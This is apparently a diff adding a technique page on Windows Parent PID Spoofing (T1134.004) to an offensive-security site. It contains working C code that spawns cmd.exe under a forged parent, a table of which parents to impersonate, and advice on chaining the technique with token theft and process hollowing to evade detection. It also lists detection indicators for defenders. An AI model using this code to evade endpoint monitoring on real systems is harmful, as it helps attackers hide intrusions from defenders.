@@ -1,0 +1,164 @@
+---
+title: Parent PID Spoofing
+mitre: T1134.004
+category: evasion
+group: Process Manipulation
+summary: Set an arbitrary parent process handle when creating a new process to fool parent-child heuristics.
+platform: [Windows]
+tags: ['C / C++', 'WinAPI']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 6 min read
+callChain:
+  - call: OpenProcess(PROCESS_CREATE_PROCESS) on target parent
+    desc: Obtain a handle to the process we want to appear as the parent.
+    dll: kernel32
+  - call: InitializeProcThreadAttributeList
+    desc: Allocate an extended attribute list for CreateProcessW.
+    dll: kernel32
+  - call: UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)
+    desc: Insert the spoofed parent handle into the attribute list.
+    dll: kernel32
+  - call: CreateProcessW with EXTENDED_STARTUPINFO_PRESENT
+    desc: The kernel records the spoofed PID as the parent in the EPROCESS structure.
+    dll: kernel32
+detections:
+  - src: SYSMON EID 1
+    text: Process creation where the recorded ParentProcessId has a different image path than the actual spawning process.
+  - src: ETW-TI
+    text: The real creating process (not the spoofed parent) is recorded in the kernel-side process creation event.
+  - src: BEHAVIOURAL
+    text: Explorer.exe or svchost.exe appearing as parent of a process that explorer or svchost would never spawn.
+  - src: MEMORY SCAN
+    text: Cross-referencing PEB.InheritedAddressSpace and the real parent's VAD tree detects the mismatch.
+related:
+  - mitre: T1055.012
+    title: Process Hollowing
+    desc: Commonly paired — hollow a process under a spoofed parent for double identity coverage.
+    href: /techniques/injection/process-hollowing
+  - mitre: T1134.001
+    title: Token Impersonation
+    desc: Token theft from the target parent makes the child inherit a matching security context.
+    href: /techniques/credential-access/token-impersonation
+  - mitre: T1106
+    title: Direct Syscalls
+    desc: Use NtCreateUserProcess directly to set the parent attribute at the syscall layer.
+    href: /techniques/evasion/direct-syscalls
+labKit:
+  - label: ppid_spoof.c + Makefile
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Windows records the parent process ID (PPID) of every new process in the kernel's `EPROCESS`
+structure. Many behavioural detections fire on anomalous parent-child pairs: `cmd.exe` spawned
+by `winword.exe`, or `powershell.exe` spawned by something that isn't `explorer.exe` or a
+legitimate shell. PPID spoofing forges the recorded parent, making the child appear to have
+been spawned by a trusted process.
+
+The mechanism is legitimate Windows API: `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` was added so
+that tools like Task Manager and services can create processes that inherit a specific parent's
+environment. Attackers re-purpose it to pick a parent whose presence in the lineage looks
+natural.
+
+<Callout type="note">
+  PPID spoofing fools tooling that reads the `ParentProcessId` field from the WMI or Sysmon
+  process creation event. It does not fool ETW-TI, which records the actual creating process
+  separately from the declared parent. An EDR with ETW-TI can see both values.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+<CodeBlock
+  file="ppid_spoof.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include \u003cwindows.h\u003e
+
+// Spawn cmd.exe under a spoofed explorer.exe parent
+void spoof_parent(DWORD target_ppid) {
+    // 1. get a handle with PROCESS_CREATE_PROCESS access
+    HANDLE h_parent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, target_ppid);
+    if (!h_parent) return;
+
+    // 2. build an extended attribute list with the parent override
+    SIZE_T attr_size = 0;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
+    LPPROC_THREAD_ATTRIBUTE_LIST attr =
+        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
+    InitializeProcThreadAttributeList(attr, 1, 0, &attr_size);
+
+    UpdateProcThreadAttribute(attr, 0,
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+        &h_parent, sizeof(HANDLE), NULL, NULL);
+
+    // 3. create the child — Sysmon/WMI will record target_ppid as parent
+    STARTUPINFOEXW si = { sizeof si };
+    si.lpAttributeList = attr;
+    PROCESS_INFORMATION pi = {0};
+
+    CreateProcessW(L"C:\\\\Windows\\\\System32\\\\cmd.exe",
+                   NULL, NULL, NULL, FALSE,
+                   CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT,
+                   NULL, NULL, &si.StartupInfo, &pi);
+
+    // cleanup
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    DeleteProcThreadAttributeList(attr);
+    HeapFree(GetProcessHeap(), 0, attr);
+    CloseHandle(h_parent);
+}`}
+/>
+
+## Common spoofed parents
+
+| Target parent | Why it looks natural |
+|---|---|
+| `explorer.exe` | Spawns user applications on logon; expected parent for GUI tools |
+| `svchost.exe -k netsvcs` | Services running from svchost spawn other helpers |
+| `WmiPrvSE.exe` | WMI consumers legitimately spawn processes here |
+| `msiexec.exe` | Installer processes frequently spawn sub-installers |
+| `userinit.exe` | Logon helper; spawns explorer and user-defined shells |
+
+Pick the parent whose natural children most closely resemble what you are spawning. A `cmd.exe`
+under `explorer.exe` is uninteresting; a `cmd.exe` under `msiexec.exe` is slightly more
+suspicious because installation sessions should be short-lived.
+
+## Combining with other techniques
+
+The most complete parent-child deception combines three primitives:
+
+1. **PPID spoofing** — the child shows the right recorded parent
+2. **Token impersonation** — the child inherits a token matching that parent's user
+3. **Process hollowing** — the child's image path matches the declared parent's expected children
+
+Each layer defeats a different detection heuristic independently. Together they produce a
+process that passes parent-child checks, token checks, and image-path checks simultaneously.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The definitive detection compares two values that ETW-TI exposes: the `ParentProcessId` field
+in the process creation event, and the handle that the creating process passed as
+`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`. When they disagree, spoofing occurred. Very few
+endpoint tools expose this comparison today — it requires an ETW-TI consumer, not just Sysmon.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
